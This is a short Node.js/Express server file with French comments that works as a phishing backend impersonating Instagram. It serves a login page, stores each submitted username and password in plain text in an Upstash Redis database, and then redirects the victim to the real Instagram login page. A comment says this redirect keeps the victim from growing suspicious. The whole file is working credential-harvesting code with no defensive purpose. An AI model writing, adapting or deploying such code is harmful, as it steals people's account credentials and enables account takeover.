const express = require('express');
const { Redis } = require('@upstash/redis');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Initialisation du client Redis avec les variables d'environnement
// C'est la méthode sécurisée et recommandée pour Vercel
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// Middleware pour lire les données du formulaire
app.use(express.urlencoded({ extended: true }));
// Middleware pour servir les fichiers statiques (ton index.html et les images)
app.use(express.static(__dirname));

// La route qui traite la soumission du formulaire
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // 1. Enregistrer les identifiants dans Redis
    // On crée une clé unique pour chaque tentative avec un timestamp pour éviter les écrasements
    const logKey = `log:${Date.now()}`;
    const logData = {
        username: username,
        password: password,
        date: new Date().toISOString()
    };

    try {
        // On stocke les données sous forme de JSON (hash) dans Redis
        await redis.hset(logKey, logData);
        console.log(`Identifiants sauvegardés dans Redis avec la clé: ${logKey}`);
    } catch (error) {
        console.error('Erreur lors de la sauvegarde dans Redis:', error);
    }

    // 2. Rediriger l'utilisateur vers le vrai site Instagram
    // C'est la partie cruciale pour que la victime ne se méfie pas
    res.redirect('https://www.instagram.com/accounts/login/');
});

// Route pour la page d'accueil (sert ton fichier index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Démarrage du serveur
app.listen(port, () => {
    console.log(`Serveur démarré sur http://localhost:${port}`);
});